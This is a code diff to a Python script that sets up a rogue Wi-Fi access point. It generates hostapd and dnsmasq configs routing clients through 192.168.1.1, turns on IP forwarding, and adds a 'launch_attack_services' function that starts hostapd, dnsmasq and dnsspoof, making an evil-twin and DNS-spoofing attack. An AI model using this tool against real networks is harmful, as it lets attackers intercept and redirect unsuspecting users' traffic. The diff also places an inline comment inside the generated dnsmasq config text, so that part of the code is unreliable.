@@ -2,8 +2,8 @@
 import subprocess
 import os
 
-def create_hostapd_config(interface, ssid, channel):
-    config_path = os.path.join(os.getcwd(), "hostapd.conf")
+def create_hostapd_config(interface, ssid, channel, config_dir):
+    config_path = os.path.join(config_dir, "hostapd.conf")
     config_content = f"""interface={interface}
 driver=nl80211
 ssid={ssid}
@@ -22,9 +22,9 @@ ignore_broadcast_ssid=0
         return None
 
 
-def create_dnsmasq_config(interface_name):
-    config_path = os.path.join(os.getcwd(), "dnsmasq.conf")
-    config_content = f"""interface={interface_name}
+def create_dnsmasq_config(interface, config_dir):  # Changed parameter name
+    config_path = os.path.join(config_dir, "dnsmasq.conf")
+    config_content = f"""interface={interface}  # Now using correct parameter name
 dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
 dhcp-option=3,192.168.1.1
 dhcp-option=6,192.168.1.1
@@ -63,6 +63,15 @@ def setup_fake_ap_network(interface='wlan0'):
     # Enable IP forwarding
     run_command("echo 1 | tee /proc/sys/net/ipv4/ip_forward")
 
+
+def launch_attack_services(interface, hostapd_conf, dnsmasq_conf):
+    cmds = [
+        f"hostapd {hostapd_conf}",
+        f"dnsmasq -C {dnsmasq_conf} -d",
+        f"dnsspoof -i {interface}"
+    ]
+    for cmd in cmds:
+        open_terminal_with_command(cmd)
 
 def open_terminal_with_command(cmd):
     try:
